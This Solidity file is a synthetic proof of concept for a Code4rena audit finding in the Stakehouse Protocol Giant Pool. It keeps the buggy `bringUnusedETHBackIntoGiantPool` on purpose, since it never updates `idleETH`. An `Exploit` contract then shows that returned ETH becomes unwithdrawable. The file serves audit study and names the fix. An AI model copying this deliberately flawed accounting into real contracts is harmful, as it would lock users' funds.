// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Stakehouse Protocol — `bringUnusedETHBackIntoGiantPool` can cause stuck
    ether funds in the Giant Pool   (Code4rena 2022-11-stakehouse, #43029, H-06)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable `GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool` body is
    inlined VERBATIM (it never touches `idleETH`), alongside the withdraw path
    from `GiantPoolBase` that gates on `idleETH`. The Exploit deploys
    everything, deposits ETH, stakes it into a vault, brings it back once
    staking hasn't started, then shows the returning ETH is stuck: `idleETH`
    never reflects it so `withdrawETH` reverts even though the pool physically
    holds the ETH again (no fork, no cheats).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: `bringUnusedETHBackIntoGiantPool` withdraws ETH from a staking
    funds vault (via `burnLPTokensForETH`) back into the Giant Pool's own ETH
    balance, but never increments `idleETH` — the accounting variable that
    tracks how much ETH is actually available for withdrawal/re-staking. Since
    nothing else updates `idleETH` except `depositETH` (+=) and
    `batchDepositETHForStaking` (-=), the ETH that comes back is physically in
    the pool's balance but permanently excluded from `idleETH`, so `withdrawETH`
    (`require(idleETH >= _amount, ...)`) reverts forever for that ETH.

    Recommended fix (per report): `idleETH += <amount returned>;` inside
    `bringUnusedETHBackIntoGiantPool`.
//////////////////////////////////////////////////////////////*/

/// @dev Minimal LP token representing a user's claim inside a single staking
///      funds vault. Mint/burn restricted to the vault that deployed it —
///      mirrors `LPToken`/`GiantLP`'s pool-only mint/burn guard.
contract VaultLP {
    address public immutable vault;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(address _vault) {
        vault = _vault;
    }

    function mint(address _to, uint256 _amount) external {
        require(msg.sender == vault, "Only vault");
        balanceOf[_to] += _amount;
        totalSupply += _amount;
    }

    function burn(address _from, uint256 _amount) external {
        require(msg.sender == vault, "Only vault");
        balanceOf[_from] -= _amount;
        totalSupply -= _amount;
    }
}

/// @notice Reduced `StakingFundsVault` — models only what the Giant Pool needs:
///         accept ETH for a BLS key (issuing a VaultLP claim to the caller) and
///         let a claim be burnt back for ETH before staking has started. Real
///         contract: contracts/liquid-staking/StakingFundsVault.sol.
contract StakingFundsVault {
    VaultLP public lp;

    constructor() {
        lp = new VaultLP(address(this));
    }

    /// @dev Reduced `depositETHForStaking` — mints 1:1 VaultLP for supplied ETH.
    function depositETHForStaking() external payable {
        lp.mint(msg.sender, msg.value);
    }

    /// @dev Faithful reduction of
    ///      contracts/liquid-staking/StakingFundsVault.sol `burnLPForETH` /
    ///      `burnLPTokensForETH`: burn the caller's LP claim, pay back the ETH.
    ///      Real function additionally gates on knot lifecycle status — omitted
    ///      here since it does not affect the bug (the pool is entitled to call
    ///      this exactly when staking has not commenced, per the finding).
    function burnLPTokensForETH(uint256 _amount) external {
        lp.burn(msg.sender, _amount);
        (bool ok, ) = msg.sender.call{value: _amount}("");
        require(ok, "Transfer failed");
    }
}

/// @notice Reduced Giant Pool — faithful reduction of
///         `GiantPoolBase` + `GiantMevAndFeesPool` (contracts/liquid-staking/).
///         Keeps `idleETH` accounting, `depositETH`, `withdrawETH`,
///         `batchDepositETHForStaking` (single-vault form) and the buggy
///         `bringUnusedETHBackIntoGiantPool` verbatim.
contract GiantMevAndFeesPool {
    uint256 public constant MIN_STAKING_AMOUNT = 0.001 ether;

    /// @notice Total amount of ETH sat idle ready for withdrawal or staking —
    ///         real state variable from `GiantPoolBase`.
    uint256 public idleETH;

    mapping(address => uint256) public giantLPBalanceOf;
    uint256 public giantLPTotalSupply;

    // ============================================================
    //  GiantPoolBase.depositETH — verbatim reduction
    // ============================================================
    function depositETH(uint256 _amount) public payable {
        require(msg.value >= MIN_STAKING_AMOUNT, "Minimum not supplied");
        require(msg.value == _amount, "Value equal to amount");

        // The ETH capital has not yet been deployed to a liquid staking network
        idleETH += msg.value;

        giantLPBalanceOf[msg.sender] += msg.value;
        giantLPTotalSupply += msg.value;
    }

    // ============================================================
    //  GiantMevAndFeesPool.batchDepositETHForStaking — reduced to a single
    //  vault (the real function loops over an array; loop body kept verbatim)
    // ============================================================
    function depositETHForStakingViaVault(StakingFundsVault _vault, uint256 _amount) external {
        // As ETH is being deployed to a staking funds vault, it is no longer idle
        idleETH -= _amount;

        _vault.depositETHForStaking{value: _amount}();
    }

    // ============================================================
    //  GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool — VERBATIM
    //  (contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138). Reduced to
    //  a single vault/amount (the real function loops over arrays; the loop
    //  BODY below is the exact, unmodified call — the bug is what's MISSING).
    // ============================================================
    function bringUnusedETHBackIntoGiantPool(StakingFundsVault _vault, uint256 _amount) external {
        _vault.burnLPTokensForETH(_amount);
        // @> VULN: idleETH is NEVER incremented here. The ETH the vault just
        // paid back is now sitting in this contract's balance, but `idleETH`
        // (the only variable `withdrawETH` checks) still reflects the OLD,
        // lower value from `depositETHForStakingViaVault`'s `idleETH -= _amount`.
        // FIX (per report): `idleETH += _amount;`
    }

    // ============================================================
    //  GiantPoolBase.withdrawETH — verbatim reduction (nonReentrant / LP-burn
    //  bookkeeping simplified to a plain balance map; the withdrawability gate
    //  `require(idleETH >= _amount, ...)` — the line that reverts on stuck
    //  funds — is preserved exactly)
    // ============================================================
    function withdrawETH(uint256 _amount) external {
        require(_amount >= MIN_STAKING_AMOUNT, "Invalid amount");
        require(giantLPBalanceOf[msg.sender] >= _amount, "Invalid balance");
        require(idleETH >= _amount, "Come back later or withdraw less ETH");

        idleETH -= _amount;

        giantLPBalanceOf[msg.sender] -= _amount;
        giantLPTotalSupply -= _amount;
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Failed to transfer ETH");
    }

    receive() external payable {}
}

/// @dev Attacker/user orchestrator. Deploys the pool + a staking funds vault,
///      deposits ETH, stakes it into the vault, brings the unused ETH back
///      before staking commenced, then demonstrates the ETH is stuck forever:
///      the pool physically holds it again, but `idleETH` never caught up, so
///      `withdrawETH` reverts. Cheatcode-free — funded via `run()`'s msg.value.
contract Exploit {
    GiantMevAndFeesPool public pool; // nonce 1
    StakingFundsVault public vault; // nonce 2

    uint256 public constant DEPOSIT_AMOUNT = 1 ether;

    constructor() {
        pool = new GiantMevAndFeesPool(); // CREATE nonce 1
        vault = new StakingFundsVault(); // CREATE nonce 2
    }

    /// @notice Runs the full deposit -> stake -> bring-back -> stuck-withdraw
    ///         sequence. Funded with `DEPOSIT_AMOUNT` ETH via `run()`'s
    ///         msg.value (see `attackValueWei` in the Playground config).
    function run() external payable {
        require(msg.value == DEPOSIT_AMOUNT, "fund run() with DEPOSIT_AMOUNT");

        // 1) Deposit ETH into the giant pool — idleETH == 1 ether.
        pool.depositETH{value: DEPOSIT_AMOUNT}(DEPOSIT_AMOUNT);
        require(pool.idleETH() == DEPOSIT_AMOUNT, "deposit did not register as idle");

        // 2) Stake it into a vault (staking has not yet commenced) —
        //    idleETH -= amount == 0; the pool's own ETH balance also drops.
        pool.depositETHForStakingViaVault(vault, DEPOSIT_AMOUNT);
        require(pool.idleETH() == 0, "idleETH should be fully deployed");
        require(address(pool).balance == 0, "pool should have paid the vault");
        require(address(vault).balance == DEPOSIT_AMOUNT, "vault should hold the ETH");

        // 3) Staking never commenced -> bring the unused ETH back into the
        //    giant pool. The vault pays the ETH back to the pool...
        pool.bringUnusedETHBackIntoGiantPool(vault, DEPOSIT_AMOUNT);
        require(address(pool).balance == DEPOSIT_AMOUNT, "pool should physically hold the ETH again");

        // HARM: ...but idleETH was NEVER incremented, so the ETH the pool is
        // physically holding is invisible to withdrawETH's gate.
        require(pool.idleETH() == 0, "idleETH stayed stuck at 0 despite the pool holding the ETH again");

        // The depositor still owns their full giant-LP balance and tries to
        // withdraw the ETH they originally deposited -> permanently reverts,
        // even though the money is sitting right there in the contract.
        bool withdrawSucceeded = _tryWithdraw(DEPOSIT_AMOUNT);
        require(!withdrawSucceeded, "withdrawETH should have reverted on stuck funds");
    }

    /// @dev try/catch wrapper so the underlying revert doesn't unwind run().
    function _tryWithdraw(uint256 _amount) internal returns (bool ok) {
        try pool.withdrawETH(_amount) {
            ok = true;
        } catch {
            ok = false;
        }
    }
}
